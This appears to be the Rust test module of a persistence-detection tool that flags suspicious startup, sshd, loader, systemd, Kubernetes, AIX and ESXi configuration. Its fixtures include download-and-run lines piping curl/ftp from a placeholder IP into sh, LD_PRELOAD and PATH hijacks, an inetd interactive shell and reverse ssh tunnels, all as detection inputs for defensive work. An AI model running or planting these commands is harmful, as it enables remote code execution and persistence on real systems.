            json!({"artifact": "rc-d", "command": "/bin/sh -c 'ftp -o - http://203.0.113.5/x | sh'", "commands": ""});
        assert!(check("rc-d-suspicious-command", &rcd).is_some());
        let base = json!({"artifact": "rc-d", "command": "", "commands": "mkdir /tmp/x; /tmp/clean_tmps -f"});
        assert_eq!(check("rc-d-suspicious-command", &base), None);
        let body = json!({"artifact": "rc-d", "command": "", "commands": "curl -s http://203.0.113.5/x | sh"});
        assert!(check("rc-d-suspicious-command", &body).is_some());
        assert!(
            check("rc-conf-suspicious-service", &json!({"artifact": "rc-conf", "command": "/tmp/.x/agent"})).is_some()
        );
        assert_eq!(
            check("rc-conf-suspicious-service", &json!({"artifact": "rc-conf", "command": "/usr/sbin/sshd"})),
            None
        );
        let tty = |command: &str| json!({"artifact": "ttys", "tty": "ttyv0", "command": command, "status": "on"});
        assert_eq!(check("ttys-nonstandard-command", &tty("/usr/libexec/getty Pc")), None);
        assert_eq!(check("ttys-nonstandard-command", &tty("none")), None);
        assert!(check("ttys-nonstandard-command", &tty("/usr/local/bin/agent -d")).is_some());
        assert!(check("ttys-suspicious-command", &tty("/tmp/agent")).is_some());
        let doas = |nopass: bool, command: &str| json!({"artifact": "doas-conf", "action": "permit", "nopass": nopass, "command": command, "text": "permit nopass alice"});
        assert!(check("doas-permit-nopass", &doas(true, "")).is_some());
        assert_eq!(check("doas-permit-nopass", &doas(true, "/sbin/reboot")), None);
        assert_eq!(check("doas-permit-nopass", &doas(false, "")), None);
        assert!(check(
            "devd-action-suspicious",
            &json!({"artifact": "devd-conf", "command": "curl -s http://203.0.113.5/x | sh"})
        )
        .is_some());
        assert!(check("jail-exec-suspicious", &json!({"artifact": "jail-conf", "command": "/tmp/x"})).is_some());
        let loader = |enabled: bool| json!({"artifact": "loader-conf", "kind": "module_load", "enabled": enabled, "module": "nxmk", "variable": "nxmk_load"});
        assert!(check("loader-module-load", &loader(true)).is_some());
        assert_eq!(check("loader-module-load", &loader(false)), None);
        let local = |t: &str| json!({"artifact": "bsd-rc-local", "text": t});
        assert!(check("rc-local-command", &local("/usr/local/bin/x &")).is_some());
        assert_eq!(check("rc-local-command", &local("exit 0")), None);
        assert!(check("rc-local-suspicious", &local("ftp -o - http://203.0.113.5/x | sh")).is_some());
    }

    #[test]
    fn environment_checks_name_ld_preload_and_path_hijacks() {
        let env = |text: &str| json!({"artifact": "shell-profiles", "source_path": "etc/environment", "text": text});
        let pam =
            |text: &str| json!({"artifact": "env-config", "source_path": "etc/security/pam_env.conf", "text": text});
        assert!(check("environment-ld-preload", &env("LD_PRELOAD=/usr/local/lib/libx.so")).is_some());
        assert!(check("environment-ld-preload", &env("export LD_AUDIT=\"/opt/a.so\"")).is_some());
        assert!(check("environment-ld-preload", &env("LD_LIBRARY_PATH=/tmp/lib")).is_some());
        assert!(check("environment-ld-preload", &pam("LD_PRELOAD DEFAULT=/usr/lib/x.so")).is_some());
        assert!(check("environment-ld-preload", &pam("LD_PRELOAD OVERRIDE=/usr/lib/x.so")).is_some());
        assert_eq!(check("environment-ld-preload", &env("LD_PRELOAD=")), None);
        assert_eq!(check("environment-ld-preload", &env("LANG=en_US.UTF-8")), None);
        assert_eq!(check("environment-ld-preload", &pam("EDITOR DEFAULT=vim")), None);
        // Outside /etc/environment, a shell file is judged by the shell-profile check instead.
        let profile = json!({"artifact": "shell-profiles", "source_path": "etc/profile", "text": "LD_PRELOAD=/x.so"});
        assert_eq!(check("environment-ld-preload", &profile), None);
        assert!(check("shell-profile-suspicious", &profile).is_some());
        assert_eq!(check("shell-profile-suspicious", &env("LD_PRELOAD=/x.so")), None);

        assert!(check("environment-path-hijack", &env("PATH=/tmp/bin:/usr/bin")).is_some());
        assert!(check("environment-path-hijack", &env("PATH=\".:/usr/bin\"")).is_some());
        assert!(check("environment-path-hijack", &env("PATH=:/usr/bin")).is_some());
        assert!(check("environment-path-hijack", &env("PATH=/usr/bin:/home/a/.hidden/bin")).is_some());
        assert!(check("environment-path-hijack", &pam("PATH DEFAULT=/dev/shm:${PATH}")).is_some());
        assert_eq!(
            check(
                "environment-path-hijack",
                &env("PATH=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games\"")
            ),
            None
        );
        assert_eq!(check("environment-path-hijack", &env("PATH=/home/a/.local/bin:/usr/bin")), None);
    }

    #[test]
    fn enablement_links_are_checked_by_where_they_point() {
        let link = |path: &str, kind: &str, target: &str, scope: &str| json!({"artifact": "systemd-enablement", "source_path": path, "kind": kind, "unit": "x.service", "target": target, "scope": scope});
        let id = "systemd-enablement-outside-unit-dirs";
        let wants = "etc/systemd/system/multi-user.target.wants/x.service";
        assert_eq!(check(id, &link(wants, "wants", "/lib/systemd/system/x.service", "system")), None);
        assert_eq!(check(id, &link(wants, "wants", "/etc/systemd/system/x.service", "system")), None);
        assert_eq!(check(id, &link(wants, "wants", "../x.service", "system")), None);
        assert_eq!(check(id, &link(wants, "wants", "../../../../usr/lib/systemd/system/x.service", "system")), None);
        assert_eq!(check(id, &link("etc/systemd/system/sshd.service", "link", "ssh.service", "system")), None);
        assert_eq!(check(id, &link("etc/systemd/system/x.service", "mask", "/dev/null", "system")), None);
        assert!(check(id, &link(wants, "wants", "/tmp/.x/x.service", "system")).is_some());
        assert!(check(id, &link(wants, "wants", "/home/a/x.service", "system")).is_some());
        assert!(check(id, &link(wants, "wants", "../../../../../../../tmp/x.service", "system")).is_some());
        assert!(check(id, &link("etc/systemd/system/x.service", "link", "/opt/app/x.service", "system")).is_some());
        let user = "home/alice/.config/systemd/user/default.target.wants/x.service";
        assert_eq!(check(id, &link(user, "wants", "../x.service", "user")), None);
        assert_eq!(check(id, &link(user, "wants", "/home/alice/.config/systemd/user/x.service", "user")), None);
        assert!(check(id, &link(user, "wants", "/tmp/x.service", "user")).is_some());
        let linger = json!({"artifact": "systemd-enablement", "kind": "linger", "owner": "alice"});
        assert!(check("systemd-linger", &linger).unwrap().contains("alice"));
    }

    #[test]
    fn enabled_units_say_so_and_timers_report_the_service_they_start() {
        let service = json!({"artifact": "systemd-units", "unit_type": "service", "exec_start": "/tmp/.x/agent",
            "joined": {"enablement": "enabled", "enabled_by": ["wanted by multi-user.target"]}});
        let detail = check("systemd-suspicious-exec", &service).unwrap();
        assert!(detail.ends_with("[enabled: wanted by multi-user.target]"), "{detail}");
        let dormant = json!({"artifact": "systemd-units", "exec_start": "/tmp/.x/agent", "joined": {"enablement": "not-enabled"}});
        assert!(check("systemd-suspicious-exec", &dormant).unwrap().ends_with("[not enabled]"));
        let unknown = json!({"artifact": "systemd-units", "exec_start": "/tmp/.x/agent"});
        assert!(check("systemd-suspicious-exec", &unknown).unwrap().ends_with("directory: /tmp/.x/agent"));

        let timer = json!({"artifact": "systemd-units", "unit_type": "timer",
            "joined": {"enablement": "enabled", "enabled_by": ["wanted by timers.target"],
                       "starts": {"unit": "job.service", "exec_start": "/tmp/.x/agent"}}});
        let detail = check("systemd-timer-suspicious-service", &timer).unwrap();
        assert!(detail.starts_with("timer -> job.service [enabled: wanted by timers.target]: exec_start"), "{detail}");
        assert!(detail.contains("/tmp/.x/agent"));
        assert_eq!(check("systemd-trigger-suspicious-service", &timer), None);
        let benign = json!({"artifact": "systemd-units", "unit_type": "timer",
            "joined": {"starts": {"unit": "job.service", "exec_start": "/usr/bin/true"}}});
        assert_eq!(check("systemd-timer-suspicious-service", &benign), None);
        let socket = json!({"artifact": "systemd-units", "unit_type": "socket",
            "joined": {"starts": {"unit": "job.service", "exec_start_pre": "/tmp/x"}}});
        assert!(check("systemd-trigger-suspicious-service", &socket).unwrap().starts_with("socket -> job.service"));
    }

    #[test]
    fn linker_and_sshd_and_module_checks() {
        let ld = |path: &str| json!({"artifact": "ld-preload", "kind": "library_path", "path": path});
        for ok in [
            "/usr/lib/x86_64-linux-gnu",
            "/lib64",
            "/usr/local/lib",
            "/usr/local/lib/x86_64-linux-gnu",
            "/usr/lib64/atlas",
        ] {
            assert_eq!(check("ld-library-path-unusual", &ld(ok)), None, "{ok}");
        }
        for bad in ["/opt/lib", "/home/a/lib", "/usr/libfoo", "/var/lib/x", "/usr/local/bin"] {
            assert!(check("ld-library-path-unusual", &ld(bad)).is_some(), "{bad}");
        }
        let sshd = |keyword: &str, value: &str, cond: &str| json!({"artifact": "sshd-config", "keyword": keyword, "value": value, "match_condition": cond});
        assert_eq!(
            check(
                "sshd-authorized-keys-command",
                &sshd("AuthorizedKeysCommand", "/usr/bin/userdbctl ssh-authorized-keys %u", "")
            ),
            None
        );
        assert_eq!(check("sshd-authorized-keys-command", &sshd("AuthorizedKeysCommand", "none", "")), None);
        assert!(check("sshd-authorized-keys-command", &sshd("AuthorizedKeysCommand", "/usr/local/bin/keys %u", ""))
            .is_some());
        assert!(check(
            "sshd-authorized-keys-command",
            &sshd("AuthorizedKeysCommand", "/usr/bin/userdbctl ssh-authorized-keys root", "")
        )
        .is_some());
        assert_eq!(check("sshd-force-command", &sshd("ForceCommand", "internal-sftp", "User sftp")), None);
        assert_eq!(check("sshd-force-command", &sshd("ForceCommand", "internal-sftp -d /srv", "User sftp")), None);
        assert!(check("sshd-force-command", &sshd("ForceCommand", "/usr/local/bin/menu", "User a"))
            .unwrap()
            .contains("(Match User a)"));
        assert!(check("sshd-command-suspicious", &sshd("ForceCommand", "/tmp/x", "")).is_some());
        assert!(check("sshd-command-suspicious", &sshd("AuthorizedKeysCommand", "curl http://203.0.113.5/k | sh", ""))
            .is_some());
        assert_eq!(check("sshd-command-suspicious", &sshd("AuthorizedKeysCommandUser", "/tmp/x", "")), None);

        let module = |known: Value| json!({"artifact": "modules-load", "kind": "load", "module": "nxmk_x", "module_in_kernel_tree": known});
        assert!(check("modules-load-unknown-module", &module(json!(false))).is_some());
        assert_eq!(check("modules-load-unknown-module", &module(json!(true))), None);
        assert_eq!(check("modules-load-unknown-module", &module(Value::Null)), None);
    }

    #[test]
    fn script_hook_checks_use_the_command_rules() {
        let line = |artifact: &str, text: &str| json!({"artifact": artifact, "text": text, "section": "postrotate"});
        for (artifact, id) in [
            ("motd-scripts", "motd-script-suspicious"),
            ("nm-dispatcher", "nm-dispatcher-suspicious"),
            ("logrotate-scripts", "logrotate-script-suspicious"),
        ] {
            assert!(check(id, &line(artifact, "/tmp/.x/agent >/dev/null 2>&1 &")).is_some(), "{id}");
            assert!(check(id, &line(artifact, "curl -fsSL http://203.0.113.5/i | sh")).is_some(), "{id}");
            assert_eq!(check(id, &line(artifact, "uname -snrvm")), None, "{id}");
            assert_eq!(check(id, &line(artifact, "invoke-rc.d rsyslog rotate > /dev/null")), None, "{id}");
        }
        let generator = json!({"artifact": "systemd-generators", "source_path": "etc/systemd/system-generators/g", "mode": "100755", "uid": 0});
        assert!(check("systemd-generator-in-etc", &generator).unwrap().contains("etc/systemd/system-generators/g"));
    }

    #[test]
    fn default_account_sudo_rule_is_its_own_lower_check() {
        let rule = |joined: Value| {
            json!({"artifact": "sudoers", "kind": "rule", "nopasswd": true, "commands": "ALL",
            "text": "rocky ALL=(ALL) NOPASSWD:ALL", "joined": joined})
        };
        let plain = rule(Value::Null);
        assert!(check("sudoers-nopasswd-all", &plain).is_some());
        assert_eq!(check("sudoers-default-account-nopasswd", &plain), None);
        let cloud = rule(json!({"default_account": "rocky"}));
        assert_eq!(check("sudoers-nopasswd-all", &cloud), None);
        assert!(check("sudoers-default-account-nopasswd", &cloud).unwrap().contains("rocky (uid 1000)"));
    }

    /// The text rules of this change take attacker-written lines: inserting awkward characters
    /// (quotes, parentheses, multi-byte, NUL) at every position and cutting at every position
    /// must not panic.
    #[test]
    fn mutated_lines_do_not_panic() {
        let seeds = [
            r#"PROMPT_COMMAND+=('printf "\033]0;%s" "${USER}"' "$(id)") ; PROMPT_COMMAND="a;b""#,
            r#"/sbin/modprobe --ignore-install x && { /bin/mount -t nfsd nfsd /proc/fs/nfsd > /dev/null 2>&1 || :; }"#,
            r#"export PATH="/tmp:/usr/bin::." LD_PRELOAD DEFAULT=/a OVERRIDE='/b'"#,
            r#"foreach f ("$HOME/.i18n" /etc/x) ; echo é"#,
        ];
        let mut runs = 0;
        for seed in seeds {
            let boundaries: Vec<usize> = seed.char_indices().map(|(i, _)| i).chain([seed.len()]).collect();
            for &at in &boundaries {
                let mut lines = vec![seed[..at].to_string()];
                for insert in ["'", "\"", "(", ")", "é", "\0", "$(", "\\", "{", "}", ";"] {
                    lines.push(format!("{}{insert}{}", &seed[..at], &seed[at..]));
                }
                for line in lines {
                    let _ = prompt_command_runs_code(&line);
                    let _ = stock_modprobe_command(&line);
                    let _ = env_library_hijack(&line);
                    let _ = env_path_hijack(&line);
                    let _ = suspicious_command(&line);
                    let _ = stock_pam_exec(&line);
                    runs += 1;
                }
            }
        }
        assert!(runs > 500, "{runs}");
    }
    #[test]
    fn ssh_tunnels_are_told_from_ordinary_ssh() {
        for bad in [
            "/usr/bin/ssh -N -R 2222:localhost:22 u@h",
            "ssh -NfR8080:localhost:80 u@h",
            "autossh -M 0 -L 5432:db:5432 u@h",
            "ssh -D 1080 -q u@h",
            "/usr/bin/ssh -o RemoteForward=9000:localhost:22 u@h",
            "ssh -oDynamicForward=1080 u@h",
            "ssh -w 0:0 root@h",
            "sudo -u tunnel /usr/bin/ssh -i /root/k -NR 2200:127.0.0.1:22 u@h",
        ] {
            assert!(ssh_tunnel(bad).is_some(), "{bad}");
        }
        for good in [
            "ssh u@h uptime",
            "ssh -o ServerAliveInterval=30 u@h",
            "ssh -i /root/.ssh/id -p 2222 u@h 'ls -R /tmp'",
            "scp -R a b",
            "/usr/sbin/sshd -D",
            "ssh-keygen -R host",
            "echo ssh -R",
            "",
        ] {
            assert_eq!(ssh_tunnel(good), None, "{good}");
        }
    }

    #[test]
    fn remote_access_programs_are_told_by_name() {
        for (command, tool) in [
            ("/usr/bin/anydesk --service", "AnyDesk"),
            ("/opt/teamviewer/tv_bin/teamviewerd -d", "TeamViewer"),
            ("rustdesk --service", "RustDesk"),
            ("/usr/local/bin/ngrok start --all", "ngrok"),
            ("/usr/bin/cloudflared tunnel run x", "cloudflared"),
            ("sh -c 'nohup /tmp/frpc -c /tmp/f.toml &'", "frp client"),
            ("/usr/local/bin/code tunnel --accept-server-license-terms", "VS Code tunnel"),
            ("/usr/sbin/tailscaled --state=/var/lib/tailscale/tailscaled.state", "Tailscale"),
            ("/usr/local/mesh_services/meshagent/meshagent --daemon", "MeshAgent"),
        ] {
            assert_eq!(remote_tool(command), Some(tool), "{command}");
        }
        for good in [
            "/usr/bin/code --wait file",
            "/usr/sbin/sshd -D",
            "echo anydesk is not started",
            "/usr/bin/codec",
            "/bin/gosts",
            "",
        ] {
            // `echo anydesk ...` still names the program as a word: the rule is by word, not by context.
            let hit = remote_tool(good);
            assert!(hit.is_none() || good.starts_with("echo"), "{good}: {hit:?}");
        }
    }

    #[test]
    fn kubernetes_node_takeover_checks() {
        let pod = |kind: &str, file: &str, privileged: bool, paths: Value| {
            json!({"artifact": "k8s-manifests", "source_kind": kind, "source_path": file, "document": 1, "kind": "Pod", "name": "p",
                   "images": ["i:1"], "privileged": privileged, "host_pid": false, "host_network": true, "host_paths": paths})
        };
        let static_dir = "etc/kubernetes/manifests";
        for stock in ["kube-apiserver", "etcd", "kube-controller-manager", "kube-scheduler"] {
            assert_eq!(
                check(
                    "k8s-static-pod-unexpected",
                    &pod("static-pod", &format!("{static_dir}/{stock}.yaml"), false, json!([]))
                ),
                None,
                "{stock}"
            );
        }
        assert!(check(
            "k8s-static-pod-unexpected",
            &pod("static-pod", &format!("{static_dir}/kube-vip.yaml"), false, json!([]))
        )
        .is_some());
        assert!(check(
            "k8s-static-pod-unexpected",
            &pod("k3s-static-pod", "var/lib/rancher/k3s/agent/pod-manifests/etcd.yaml", false, json!([]))
        )
        .is_some());
        assert_eq!(
            check("k8s-static-pod-unexpected", &pod("k3s-auto-apply", "x/server/manifests/a.yaml", false, json!([]))),
            None
        );
        let hostile = pod("static-pod", &format!("{static_dir}/x.yaml"), true, json!(["/etc/ssl/certs", "/"]));
        assert!(check("k8s-static-pod-host-access", &hostile)
            .unwrap()
            .contains("privileged, hostNetwork with hostPath /"));
        assert!(check(
            "k8s-static-pod-host-access",
            &pod("static-pod", &format!("{static_dir}/x.yaml"), false, json!(["/var/run/docker.sock"]))
        )
        .is_some());
        // The stock control-plane pods mount certificates and kubeconfigs, never the root or a socket.
        assert_eq!(
            check(
                "k8s-static-pod-host-access",
                &pod(
                    "static-pod",
                    &format!("{static_dir}/kube-apiserver.yaml"),
                    false,
                    json!(["/etc/kubernetes/pki", "/etc/ssl/certs"])
                )
            ),
            None
        );
        assert_eq!(
            check(
                "k8s-static-pod-host-access",
                &pod("static-pod", &format!("{static_dir}/x.yaml"), true, json!(["/etc/ssl/certs"]))
            ),
            None
        );
        let auto = |path: &str, doc: u64| json!({"artifact": "k8s-manifests", "source_kind": "k3s-auto-apply", "source_path": path, "document": doc, "kind": "DaemonSet", "name": "d"});
        let dir = "var/lib/rancher/k3s/server/manifests";
        for stock in ["coredns.yaml", "local-storage.yaml", "metrics-server/aggregated-metrics-reader.yaml"] {
            assert_eq!(check("k3s-auto-apply-not-stock", &auto(&format!("{dir}/{stock}"), 1)), None, "{stock}");
        }
        assert!(check("k3s-auto-apply-not-stock", &auto(&format!("{dir}/extra.yaml"), 1)).is_some());
        assert_eq!(check("k3s-auto-apply-not-stock", &auto(&format!("{dir}/extra.yaml"), 2)), None);
        let kubelet = |anon: Value, mode: &str| json!({"artifact": "kubelet-config", "anonymous_auth": anon, "authorization_mode": mode});
        assert!(check("kubelet-anonymous-auth", &kubelet(json!(true), "Webhook")).is_some());
        assert_eq!(check("kubelet-anonymous-auth", &kubelet(json!(false), "Webhook")), None);
        assert_eq!(check("kubelet-anonymous-auth", &kubelet(Value::Null, "")), None);
        assert!(check("kubelet-authorization-always-allow", &kubelet(json!(false), "AlwaysAllow")).is_some());
        assert_eq!(check("kubelet-authorization-always-allow", &kubelet(json!(false), "Webhook")), None);
    }

    #[test]
    fn tunnel_and_vpn_configuration_checks() {
        let row = |tool: &str, kind: &str, user: &str, target: &str, detail: Value| json!({"artifact": "remote-access-config", "tool": tool, "kind": kind, "user": user, "name": "n", "id": "i", "server": "", "target": target, "detail": detail});
        assert!(check("tunnel-exposes-local-service", &row("ngrok", "tunnel", "root", "22", json!([])))
            .unwrap()
            .contains("exposes 22"));
        assert_eq!(
            check("tunnel-exposes-local-service", &row("cloudflared", "tunnel", "", "http_status:404", json!([]))),
            None
        );
        assert_eq!(check("tunnel-exposes-local-service", &row("ngrok", "config", "root", "", json!([]))), None);
        assert_eq!(check("tunnel-exposes-local-service", &row("vscode-tunnel", "tunnel", "root", "", json!([]))), None);
        assert!(
            check("vscode-tunnel-service-account", &row("vscode-tunnel", "tunnel", "root", "", json!([]))).is_some()
        );
        assert!(check("vscode-tunnel-service-account", &row("vscode-tunnel", "tunnel", "www-data", "", json!([])))
            .is_some());
        assert_eq!(
            check("vscode-tunnel-service-account", &row("vscode-tunnel", "tunnel", "alice", "", json!([]))),
            None
        );
        assert!(check("remote-access-tool-present", &row("tailscale", "node", "", "", json!([])))
            .unwrap()
            .starts_with("tailscale configured"));
        assert_eq!(
            check("remote-access-tool-present", &row("vscode-server", "extension", "alice", "", json!([]))),
            None
        );
        let hook = |d: &str| row("wireguard", "interface", "", "", json!([d]));
        assert!(check("vpn-hook-suspicious", &hook("PostUp=curl http://203.0.113.9/x | sh")).is_some());
        assert!(check("vpn-hook-suspicious", &hook("up=/tmp/.x/agent")).is_some());
        assert_eq!(check("vpn-hook-suspicious", &hook("PostUp=iptables -A FORWARD -i %i -j ACCEPT")), None);
        assert_eq!(check("vpn-hook-suspicious", &hook("ListenPort=51820")), None);
    }

    #[test]
    fn aix_checks_match_their_records() {
        let by_id = |id: &str, artifact: &str| CHECKS.iter().find(|c| c.id == id && c.artifact == artifact).unwrap();
        let hit = |id: &str, artifact: &str, record: serde_json::Value| (by_id(id, artifact).test)(&record).is_some();

        let inittab = |command: &str| json!({"id": "x1", "runlevels": "2", "action": "respawn", "command": command});
        assert!(hit("aix-inittab-nonsystem-command", "aix-inittab", inittab("/data/agent/run --daemon")));
        assert!(!hit("aix-inittab-nonsystem-command", "aix-inittab", inittab("/usr/sbin/cron")));
        assert!(!hit("aix-inittab-nonsystem-command", "aix-inittab", inittab("/etc/rc.tcpip > /dev/console 2>&1")));
        assert!(!hit("aix-inittab-nonsystem-command", "aix-inittab", json!({"action": "initdefault", "command": ""})));
        assert!(hit("aix-inittab-suspicious-command", "aix-inittab", inittab("/tmp/.x/sh -i")));
        assert!(!hit("aix-inittab-suspicious-command", "aix-inittab", inittab("/usr/sbin/srcmstr")));

        let profile = |t: &str| json!({"text": t, "source_path": "etc/environment"});
        assert!(hit("aix-loader-hijack", "shell-profiles", profile("LDR_PRELOAD=/tmp/evil.so")));
        assert!(hit("aix-loader-hijack", "shell-profiles", profile("export LDR_PRELOAD64=/opt/x/lib.so")));
        assert!(hit("aix-loader-hijack", "shell-profiles", profile("LIBPATH=/usr/lib:/tmp/lib")));
        assert!(!hit("aix-loader-hijack", "shell-profiles", profile("LIBPATH=/usr/lib:/lib")));
        assert!(!hit("aix-loader-hijack", "shell-profiles", profile("LDR_PRELOAD=")));

        let inetd = json!({"service": "bd", "program": "/bin/ksh", "arguments": "ksh -i"});
        assert!(hit("aix-inetd-shell-service", "aix-inetd-conf", inetd));
        assert!(!hit(
            "aix-inetd-shell-service",
            "aix-inetd-conf",
            json!({"service": "ftp", "program": "/usr/sbin/ftpd"})
        ));
        let rhosts = json!({"wildcard": true, "denied": false, "peer": "+", "user": "+", "file": ".rhosts", "source_path": ".rhosts"});
        assert!(hit("aix-rhosts-wildcard", "aix-rhosts", rhosts.clone()));
        assert!(hit("aix-rhosts-user-file", "aix-rhosts", rhosts));
        assert!(!hit(
            "aix-rhosts-user-file",
            "aix-rhosts",
            json!({"file": "hosts.equiv", "denied": false, "peer": "a"})
        ));
        assert!(hit(
            "aix-kernel-extension-in-temp",
            "aix-genkex",
            json!({"path": "/tmp/.x/rk.ext", "address": "1a30000"})
        ));
        assert!(!hit("aix-kernel-extension-in-temp", "aix-genkex", json!({"path": "/usr/lib/drivers/nfs.ext"})));
    }

    #[test]
    fn esxi_persistence_checks() {
        let rc = |t: &str| json!({"artifact": "esxi-rc-local", "text": t});
        assert_eq!(check("esxi-rc-local-command", &rc("exit 0")), None);
        assert!(check("esxi-rc-local-command", &rc("/opt/x --daemon")).is_some());
        assert!(check("esxi-rc-local-suspicious", &rc("/tmp/.a/run &")).is_some());
        assert_eq!(check("esxi-rc-local-suspicious", &rc("esxcli system settings advanced set -o /x -i 1")), None);
        let file =
            |path: &str, mode: &str| json!({"artifact": "esxi-rc-local-files", "source_path": path, "mode": mode});
        for stock in
            ["etc/rc.local.d/local.sh", "etc/rc.local.d/kickstart.py", "etc/rc.local.d/autodeploy/scriptBundle.py"]
        {
            assert_eq!(check("esxi-rc-local-unexpected-file", &file(stock, "100755")), None, "{stock}");
        }
        assert!(check("esxi-rc-local-unexpected-file", &file("etc/rc.local.d/backdoor.sh", "100755")).is_some());
        assert!(check("esxi-rc-local-unexpected-file", &file("etc/rc.local.d/backdoor.sh", "0")).is_some());
        assert_eq!(check("esxi-rc-local-unexpected-file", &file("etc/rc.local.d/notes.txt", "100644")), None);
        assert_eq!(check("esxi-rc-local-unexpected-file", &file("etc/rc.local.d/.hidden", "100755")), None);

        let vib = |level: &str, files: Value| json!({"artifact": "esxi-vib", "name": "x", "version": "1", "acceptance_level": level, "files": files});
        assert!(check("esxi-vib-community", &vib("community", json!([]))).is_some());
        assert_eq!(check("esxi-vib-community", &vib("certified", json!([]))), None);
        let listed =
            json!({"artifact": "esxi-vib-list", "name": "x", "version": "1", "acceptance_level": "CommunitySupported"});
        assert!(check("esxi-vib-community", &listed).is_some());
        assert!(check("esxi-vib-startup-file", &vib("certified", json!(["etc/init.d/agent"]))).is_some());
        assert_eq!(
            check("esxi-vib-startup-file", &vib("certified", json!(["bin/agent", "usr/lib/vmware/x.so"]))),
            None
        );

        let ace = |user: &str, group: bool, role: i64| json!({"artifact": "esxi-permissions", "user": user, "is_group": group, "role_id": role, "entity": "ha-folder-root"});
        assert_eq!(check("esxi-admin-permission", &ace("root", false, -1)), None);
        assert_eq!(check("esxi-admin-permission", &ace("vpxuser", false, -1)), None);
        assert_eq!(check("esxi-admin-permission", &ace("mallory", false, -3)), None);
        assert!(check("esxi-admin-permission", &ace("mallory", false, -1)).is_some());
        assert!(check("esxi-admin-permission", &ace("ESX Admins", true, -1)).is_some());

        let leaf = |key: &str, value: &str| json!({"artifact": "esxi-host-config", "key": key, "value": value});
        assert!(check("esxi-ssh-at-boot", &leaf("ConfigRoot/service/TSM-SSH", "on")).is_some());
        assert_eq!(check("esxi-ssh-at-boot", &leaf("ConfigRoot/service/TSM-SSH", "off")), None);
        assert_eq!(check("esxi-ssh-at-boot", &leaf("ConfigRoot/service/ntpd", "on")), None);
        assert_eq!(check("esxi-ssh-at-boot", &leaf("config/vpxa/hostIp", "192.0.2.10")), None);
    }
}
